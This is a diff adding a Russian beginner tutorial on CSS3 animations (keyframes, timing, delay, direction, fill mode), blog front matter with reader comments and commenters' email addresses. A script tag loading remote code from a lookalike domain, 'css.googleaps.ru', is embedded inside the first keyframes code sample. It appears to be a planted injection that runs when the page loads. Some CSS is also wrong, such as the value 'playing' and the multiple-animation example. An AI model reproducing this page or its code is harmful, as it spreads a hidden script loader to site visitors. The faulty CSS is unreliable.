@@ -1,0 +1,276 @@
+---
+layout: post
+status: publish
+published: true
+title: CSS3 анимации для начинающих
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: "Человеческий мозг так устроен, что обращает внимание на любые движения.
+  Поэтому любая анимация на сайте будет обязана привлечь, хотя бы, мимолетное внимание
+  пользователя.\r\nКогда анимации выполнены на достойном уровне, правильно применяются
+  на сайте и в дизайне они повышают качество обратной связи пользователя, повышают
+  эмоциональный уровень и придают индивидуальность дизайну.\r\nВ этой статье мы рассмотрим
+  основы CSS3 анимаций. Пройдем курс от и до."
+wordpress_id: 299
+wordpress_url: http://devdocs.ru/?p=299
+date: '2014-12-18 15:36:29 +0200'
+date_gmt: '2014-12-18 15:36:29 +0200'
+categories:
+- Верстка
+tags:
+- css
+- css3
+- html5
+- animations
+- js
+- sass
+- orm
+comments:
+- id: 236
+  author: Мария
+  author_email: tennalian@gmail.com
+  author_url: ''
+  date: '2014-12-18 16:35:02 +0200'
+  date_gmt: '2014-12-18 16:35:02 +0200'
+  content: Отличная статья. Наконец-то хоть кто-то рассмотрел animation-direction,
+    постоянно из головы вылетает)
+- id: 237
+  author: Dogica
+  author_email: nofair@ya.ru
+  author_url: ''
+  date: '2014-12-19 10:36:23 +0200'
+  date_gmt: '2014-12-19 10:36:23 +0200'
+  content: |-
+    Да просто супер!
+    Спасибочки огромнейшее.
+- id: 238
+  author: dogica
+  author_email: nofair@ya.ru
+  author_url: ''
+  date: '2014-12-26 10:41:05 +0200'
+  date_gmt: '2014-12-26 10:41:05 +0200'
+  content: как прикрутить этот код ко всем  на страничке?
+- id: 239
+  author: maxyc
+  author_email: maxycws@gmail.com
+  author_url: http://vk.com/id202532070
+  date: '2014-12-26 14:18:13 +0200'
+  date_gmt: '2014-12-26 14:18:13 +0200'
+  content: Не совсем понял вопроса. В статье ясно рассказывается как описать анимацию
+    в CSS. Как подключать ее, это уже из основ CSS.
+- id: 240
+  author: dogica
+  author_email: nofair@ya.ru
+  author_url: http://www.dogica.com
+  date: '2014-12-28 16:10:58 +0200'
+  date_gmt: '2014-12-28 16:10:58 +0200'
+  content: |-
+    Хотелось бы применить вот эту анимацию ко всем  на страничке
+    чтобы когда она открывается - каждая картинка появлялась так же как HELLO DEV
+    Менял div на img - ничего не происходит..
+
+    @keyframes bounceIn {
+      0% {
+        transform: scale(0.1);
+        opacity: 0;
+      }
+      60% {
+        transform: scale(1.2);
+        opacity: 1;
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    div {
+      animation-duration: 2s;
+      animation-name: bounceIn;
+    }
+- id: 241
+  author: dogica
+  author_email: nofair@ya.ru
+  author_url: http://www.dogica.com
+  date: '2014-12-29 15:43:12 +0200'
+  date_gmt: '2014-12-29 15:43:12 +0200'
+  content: |-
+    Разобрался. Применил 1й пример ко всем картинкам на страничке
+    Вот пример: http:&#47;&#47;www.dogica.com
+- id: 242
+  author: AD
+  author_email: ad@ya.ru
+  author_url: ''
+  date: '2015-01-22 12:12:17 +0200'
+  date_gmt: '2015-01-22 12:12:17 +0200'
+  content: Вы гений! Чудесный сайт!
+- id: 243
+  author: maxyc
+  author_email: maxycws@gmail.com
+  author_url: http://vk.com/id202532070
+  date: '2015-01-22 13:27:59 +0200'
+  date_gmt: '2015-01-22 13:27:59 +0200'
+  content: Спасибо
+- id: 456
+  author: Mikhail Lebedev
+  author_email: zaza41rus@gmail.com
+  author_url: https://www.facebook.com/app_scoped_user_id/100000850717643/
+  date: '2016-06-04 03:46:14 +0200'
+  date_gmt: '2016-06-04 03:46:14 +0200'
+  content: "А как задать повтор выполнения анимации через определенное время?\r\n\r\nнапример:
+    \r\nесть один SVG с тремя анимациями. \r\nКаждая начинается с задержкой в 1&#47;5&#47;3
+    сек\r\nУ каждой свое время выполнения анимации 8&#47;2&#47;5сек\r\nУ каждой свое
+    количество повторов и тп..\r\n\r\nТеперь как задать интервал, чтоб например через
+    1мин анимация повторилась вся ?\r\n(или через 4 минуты повторилась 2 анимация,
+    а через 5 минут - третья)"
+---
+<p>Человеческий мозг так устроен, что обращает внимание на любые движения. Поэтому любая анимация на сайте будет обязана привлечь, хотя бы, мимолетное внимание пользователя.<br />
+Когда анимации выполнены на достойном уровне, правильно применяются на сайте и в дизайне они повышают качество обратной связи пользователя, повышают эмоциональный уровень и придают индивидуальность дизайну.<br />
+В этой статье мы рассмотрим основы CSS3 анимаций. Пройдем курс от и до.<a id="more"></a><a id="more-299"></a></p>
+<h2>Строительные блоки анимаций<&#47;h2><br />
+Все CSS анимации состоят из двух основных моментов:</p>
+<ol>
+<li><strong>Ключевые кадры<&#47;strong> (keyframes) - определяют основные этапы и стиль анимаций<&#47;li>
+<li><strong>Свойства анимаций<&#47;strong> (animation properties) - подключение определенной анимации к css элементу и определение вариантов запуска анимаций<&#47;li><br />
+<&#47;ol><br />
+Давайте посмотрим на каждый в отдельности.</p>
+<h2>Ключевые кадры (keyframes)<&#47;h2><br />
+Ключевые кадры являются основой CSS анимации. Они определяют то, как анимация выглядит на каждом этапе временной шкалы. Каждый <strong>@keyframes<&#47;strong> состоит из:</p>
+<ul>
+<li><strong> Имя анимации<&#47;strong>: имя, описывающее анимацию, например, <strong>bounceIn<&#47;strong> .<&#47;li>
+<li><strong> Этапы анимации<&#47;strong>: каждый этап анимации представлен ​​в процентах. 0% представляет собой начальное состояние анимации. 100% представляет собой конечное состояние анимации. Между этими двумя состояниями можно добавить еще 98 этапов.<&#47;li>
+<li><strong> CSS свойства<&#47;strong>: CSS свойств, определяются для каждого этапа временной шкалы.<&#47;li><br />
+<&#47;ul><br />
+Давайте сделаем наш первый и самый простой <strong>@<&#47;strong>. Я назову его "<strong>bounceIn<&#47;strong>". Этот <strong>@keyframes<&#47;strong> состоит из трех этапов. На первом этапе(0%)наш элемент будет находится в непрозрачности 0 и масштабируется до 10 процентов размера по умолчанию, используя CSS преобразования масштаба (transform: scale(0.1). На втором этапе (60%) элемент полностью проявляется и увеличивается до 120 процентов размера по умолчанию. На заключительном этапе (100%) мы возвращаем элемент назад к своему размеру по умолчанию.</p>
+<pre class="brush: css; gutter: true">@keyframes bounceIn {<br />
+    0% { transform: scale(0.1); opacity: 0; }<br />
+    60% { transform: scale(1.2); opacity: 1; }<br />
+    100% { transform: scale(1); }<br />
+}<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+<h2>Свойства анимаций<&#47;h2><br />
+После того как ключевые кадры были реализованы, они должны быть подключены к css элементам, для того, чтобы указать как и при каких условиях им необходимо срабатывать.</p>
+<p>Необходимо добавить следующие два свойства анимации для того, чтобы анимации запустились:</p>
+<ul>
+<li><strong>animation-name<&#47;strong>: название анимации, определены в @keyframes .<&#47;li>
+<li><strong>animation-duration<&#47;strong>: продолжительность анимации в секундах (например, 5s) или в миллисекундах (например, 200ms).<&#47;li><br />
+<&#47;ul><br />
+Давайте на примере нашего keyframes с именем bounceIn анимируем один из div'ов на странице</p>
+<pre class="brush: css; gutter: true">div {<br />
+  animation-duration: 2s;<br />
+  animation-name: bounceIn;<br />
+}<&#47;pre><br />
+Можно также записать в сокращенной форме</p>
+<pre class="brush: css; gutter: true">div { animation: bounceIn 2s; }<&#47;pre><br />
+<strong>Пример того, что получилось (для повтора анимации нажмите "Result")<&#47;strong></p>
+<p>[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;d6wmo7ea&#47;1&#47;"]</p>
+<p>Свойства анимаций могут быть определены в виде сокращенной формы для более чистого кода.</p>
+<pre class="brush: css; gutter: true"> animation: [animation-name] [animation-duration] [animation-timing-function] [animation-delay] [animation-iteration-count] [animation-direction] [animation-fill-mode] [animation-play-state];<&#47;pre><br />
+Для работы с сокращенной формой записи, необходимо использовать только этот порядок параметров и указать как минимум два первых параметра.</p>
+<h2>Кроссбраузерность<&#47;h2><br />
+По состоянию на конец 2014 года, многие <strong>Webkit браузеры<&#47;strong> по-прежнему требуют использовать префиксы <strong>-webkit<&#47;strong> для ключевых кадров, свойств анимаций.</p>
+<pre class="brush: css; gutter: true">div {<br />
+    -webkit-animation-duration: 2s;<br />
+    animation-duration: 2s;<br />
+    -webkit-animation-name: bounceIn;<br />
+    animation-name: bounceIn;<br />
+}<br />
+@-webkit-keyframes bounceIn { &#47;* styles *&#47; }<br />
+@keyframes bounceIn { &#47;* styles *&#47; }<&#47;pre><br />
+Чтобы сделать себе жизнь проще, советую рассмотреть возможность использования <strong>Bourbon<&#47;strong>, <strong>Sass<&#47;strong>, <strong>Less<&#47;strong>, <strong>Compass<&#47;strong>. Пример анимации с использованием <strong>бурбон<&#47;strong></p>
+<pre class="brush: css; gutter: true">div { @include animation(bounceIn 2s); }<br />
+@include keyframes(bouncein) { &#47;* styles *&#47;}<&#47;pre></p>
+<h2>Дополнительные свойства анимации<&#47;h2><br />
+Помимо основных свойств (имя, длительность) можно использовать дополнительные свойства для построения более сложных анимаций</p>
+<ul>
+<li><strong>animation-timing-function<&#47;strong><&#47;li>
+<li><strong>animation-delay<&#47;strong><&#47;li>
+<li><strong>animation-iteration-count<&#47;strong><&#47;li>
+<li><strong>animation-direction<&#47;strong><&#47;li>
+<li><strong>animation-fill-mode<&#47;strong><&#47;li>
+<li><strong>animation-play-state<&#47;strong><&#47;li><br />
+<&#47;ul><br />
+&nbsp;</p>
+<h3>animation-timing-function<&#47;h3><br />
+Определяет кривую скорости или темпа анимации. Вы можете указать следующие варианты:</p>
+<ul>
+<li><strong>ease <&#47;strong><&#47;li>
+<li><strong>linear <&#47;strong><&#47;li>
+<li><strong>ease-in<&#47;strong><&#47;li>
+<li><strong>ease-out<&#47;strong><&#47;li>
+<li><strong>ease-in-out<&#47;strong><&#47;li>
+<li><strong> initial <&#47;strong><&#47;li>
+<li><strong>inherit<&#47;strong><&#47;li><br />
+<&#47;ul><br />
+[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;adtab4bd&#47;1&#47;"]</p>
+<p>Значением по умолчанию является ease. Эта анимация медленно начинается, ускоряется и к концу снова замедляется. Подробнее про варианты анимаций<br />
+CSS синтаксис:</p>
+<pre class="brush: css; gutter: true">animation-timing-function: ease-in-out;<&#47;pre><br />
+Сокращенный синтаксис (рекомендуется):</p>
+<pre class="brush: css; gutter: true">animation: [animation-name] [animation-duration] [animation-timing-function]; animation: bounceIn 2s ease-in-out;<&#47;pre></p>
+<h3>animation-delay<&#47;h3><br />
+Позволяет указать, когда анимация (или часть анимации) начнется. Положительное значение (например, 2S) означает, что анимация стартует только через 2 секунды. Если значение будет отрицательным, то анимация начнется сразу же, не не с самого начала, а "перемотанная" на 2 секунды вперед.</p>
+<p>Значение определяется в секундах (s) или миллисекундах (ms).</p>
+<p>[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;maxyc&#47;1jkew1gh&#47;"]</p>
+<p>CSS синтаксис:</p>
+<pre class="brush: css; gutter: true">animation-delay: 5s;<&#47;pre><br />
+Cокращенный синтаксис (рекомендуется):</p>
+<pre class="brush: css; gutter: true">animation: [animation-name] [animation-duration] [animation-timing-function] [animation-delay]; animation: bounceIn 2s ease-in-out 3s;<br />
+<&#47;pre></p>
+<h3>animation-iteration-count<&#47;h3><br />
+Определяет количество раз, которое анимация будет повторяться.</p>
+<p>Возможные значения:</p>
+<ul>
+<li><strong>#<&#47;strong> - определенное количество итераций (по умолчанию 1 )<&#47;li>
+<li><strong>infinite<&#47;strong> - анимация повторяется всегда<&#47;li>
+<li><strong>initial<&#47;strong> - задает число итераций указанное по умолчанию<&#47;li>
+<li><strong>inherit<&#47;strong> - наследует значение от родителей<&#47;li><br />
+<&#47;ul><br />
+CSS синтаксис:</p>
+<pre class="brush: css; gutter: true">animation-iteration-count: 2;<&#47;pre><br />
+Сокращенный синтаксис (рекомендуется):</p>
+<pre class="brush: bash; gutter: true">animation: [animation-name] [animation-duration] [animation-timing-function] [animation-delay] [animation-iteration-count]; animation: bounceIn 2s ease-in-out 3s 2;<&#47;pre><br />
+[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;maxyc&#47;hc382dpo&#47;"]</p>
+<h3>animation-direction<&#47;h3><br />
+Свойство определяет, должна ли анимация проигрываться вперед, назад или в цикле.</p>
+<p>Возможные значения:</p>
+<ul>
+<li><strong>normal<&#47;strong> (по умолчанию) - анимация проигрывается вперед. На каждом цикле анимации сбрасывается на начальном состоянии (0%) и проигрывается снова вперед (до 100%).<&#47;li>
+<li><strong>reverse<&#47;strong> - анимация проигрывается в обратном направлении. На каждом цикле анимации сбрасывает в конечное состояние (100%) и проигрывается в обратном направлении (до 0%).<&#47;li>
+<li><strong>alternate<&#47;strong> - анимация меняет направление при каждой итерации цикла. На каждой нечетной итерации цикла, анимация проигрывается вперед (от 0% до 100%). На каждой четной итерации цикла анимация проигрывается в обратном направлении (100% до 0%).<&#47;li>
+<li><strong>alternate-reverse<&#47;strong> - анимация меняет направление каждого цикла. На каждой нечетной итерации цикла, анимация проигрывается в обратном направлении (100% до 0%). На каждой четной итерации цикла, анимация проигрывается вперед (0% или 100%).<&#47;li><br />
+<&#47;ul><br />
+CSS синтаксис:</p>
+<pre class="brush: css; gutter: true">animation-direction: alternate;<&#47;pre><br />
+Сокращенный синтаксис (рекомендуется):</p>
+<pre class="brush: css; gutter: true">animation: [animation-name] [animation-duration] [animation-timing-function] [animation-delay] [animation-iteration-count] [animation-direction]; animation: bounceIn 2s ease-in-out 3s 3 alternate;<&#47;pre><br />
+[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;maxyc&#47;ehdpytzb&#47;"]</p>
+<h3>animation-fill-mode<&#47;h3><br />
+Данное свойство определяет, как будет вести себя элемент после окончания анимации. По умолчанию, до старта или после анимация никак не влияет на стили элемента.</p>
+<ul>
+<li><strong>backwards<&#47;strong> - до анимации стили начального ключевого кадра (0%) применяются к элементу.<&#47;li>
+<li><strong>forwards<&#47;strong> - после завершения анимации, стили, определенные в последнем ключевом кадре (100%) сохраняются в элементе.<&#47;li>
+<li><strong>both<&#47;strong> - анимация будет следовать правилам, как для <strong>backwards<&#47;strong> так и для <strong>forwards<&#47;strong>.<&#47;li>
+<li><strong>normal<&#47;strong> (по умолчанию) - анимация не применяет какие-либо стили к элементу, до или после анимации.<&#47;li><br />
+<&#47;ul><br />
+CSS синтаксис:</p>
+<pre class="brush: css; gutter: true">animation-fill-mode: forwards;<&#47;pre><br />
+Сокращенный синтаксис (рекомендуется):</p>
+<pre class="brush: css; gutter: true">animation: [animation-name] [animation-duration] [animation-timing-function] [animation-delay] [animation-iteration-count] [animation-direction] [animation-fill-mode]; animation: bounceIn 2s ease-in-out 3s 3 forwards;<&#47;pre><br />
+[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;maxyc&#47;q4ho4u68&#47;"]</p>
+<h3>animation-play-state<&#47;h3><br />
+С помощью данного свойства, мы можем останавливать или продолжать воспроизведение анимации.</p>
+<p>Возможные значения:</p>
+<ul>
+<li><strong>playing<&#47;strong> - анимация в настоящее время работает<&#47;li>
+<li><strong>paused<&#47;strong> - анимация в настоящий момент приостановлена<&#47;li><br />
+<&#47;ul><br />
+Пример:</p>
+<pre class="brush: css; gutter: true">.div:hover { animation-play-state: paused; }<&#47;pre><br />
+[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;maxyc&#47;hpoaz0rk&#47;"]</p>
+<h3>Несколько анимаций<&#47;h3><br />
+Чтобы добавить несколько анимаций на селектор, вы просто разделите значения запятыми. Вот пример:</p>
+<pre class="brush: css; gutter: true">.div { animation: slideIn 2s, animation: rotate 1.75s; }<&#47;pre></p>
